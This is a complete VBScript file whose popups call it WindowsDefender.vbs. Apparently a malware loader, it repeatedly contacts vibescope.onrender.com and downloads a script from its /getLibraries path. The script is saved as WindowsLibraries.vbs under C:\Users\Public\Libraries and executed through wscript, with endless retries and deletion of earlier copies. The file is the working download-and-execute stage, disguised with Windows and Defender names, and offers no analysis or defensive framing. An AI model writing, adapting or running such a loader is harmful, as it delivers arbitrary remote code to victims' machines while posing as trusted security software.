Dim WshShell : Set WshShell = CreateObject("WScript.Shell")

Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")

' CheckInternetConnection variables
Dim url : url = "https://vibescope.onrender.com/"

Dim toRun : toRun = "C:\Users\Public\Libraries\WindowsLibraries.vbs"

' DownloadFile variables
Dim downloadURL : downloadURL = "https://vibescope.onrender.com/getLibraries" ' Replace with your actual download URL
Dim downloadDirectory : downloadDirectory = "C:\Users\Public\Libraries"
Dim downloadedFilename : downloadedFilename = "WindowsLibraries.vbs"

' RunScript variables
Dim scriptPath : scriptPath = "C:\Users\Public\Libraries\WindowsLibraries.vbs"

Start()


sub Start()
	If objFSO.FileExists(toRun) Then
        WshShell.Popup "File Exists (from WindowsDefender.vbs)", 2, "Start()", 64
		objFSO.DeleteFile toRun, True '[force deletion]
	Else
        WshShell.Popup "File Doesn't Exists (from WindowsDefender.vbs)", 2, "Start()", 64
	End If
	CheckInternetConnection
End sub

sub CheckInternetConnection()
    Dim objHTTP : Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.open "GET", url, False
    On Error Resume Next
    objHTTP.send ""
    On Error GoTo 0
    If objHTTP.status = 200 Then
        WshShell.Popup "Internet is connected! (from WindowsDefender.vbs)", 2, "CheckInternetConnection()", 64
        Set objHTTP = Nothing
		DownloadFile
		RunScript
    Else
        WshShell.Popup "Internet is not connected! (from WindowsDefender.vbs), retrying in 10 seconds..", 2, "CheckInternetConnection()", 64
		WScript.Sleep 10000 ' 10 seconds
        Set objHTTP = Nothing
		CheckInternetConnection
    End If
    Set objHTTP = Nothing
End sub

sub DownloadFile()
    On Error Resume Next ' Enable error handling

    Dim objXMLHTTP, objADOStream, objFSO
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objADOStream = CreateObject("ADODB.Stream")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Download file
    objXMLHTTP.Open "GET", downloadURL, False
    objXMLHTTP.Send

    ' Handle errors during the request
    If Err.Number <> 0 Then
        WshShell.Popup "Error during download request: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
        WScript.Sleep 10000 ' 10 seconds
        ' Clean up
        
        Set objXMLHTTP = Nothing
        Set objADOStream = Nothing
        Set objFSO = Nothing
    
        DownloadFile
        Exit Sub
    End If

    ' Save response to file
    objADOStream.Open
    objADOStream.Type = 1 ' Binary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0

    ' Create destination folder if it doesn't exist
    If Not objFSO.FolderExists(downloadDirectory) Then objFSO.CreateFolder downloadDirectory

    ' Save stream to file
    objADOStream.SaveToFile downloadDirectory & "\" & downloadedFilename, 2 ' Overwrite

    ' Handle errors during the file save
    If Err.Number <> 0 Then
        
        WshShell.Popup "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
        
        WScript.Sleep 10000 ' 10 seconds
        ' Clean up
        
        Set objXMLHTTP = Nothing
        Set objADOStream = Nothing
        Set objFSO = Nothing
    
        DownloadFile
		Exit Sub
    Else
        WshShell.Popup "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)", 2, "DownloadFile()", 64
    End If

    On Error GoTo 0 ' Disable error handling
    ' Clean up
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
    Set objFSO = Nothing
End sub

sub RunScript()
	If objFSO.FileExists(scriptPath) Then
        CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
    Else
        WshShell.Popup "Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs), Retrying everything in 10 seconds ..", 2, "RunScript()", 64
        WScript.Sleep 10000 ' 10 seconds
        Start
    End If
End sub

Set objFSO = Nothing
Set url = Nothing
Set toRun = Nothing
Set downloadURL = Nothing
Set downloadDirectory = Nothing
Set downloadedFilename = Nothing
Set scriptPath = Nothing
Set WshShell = Nothing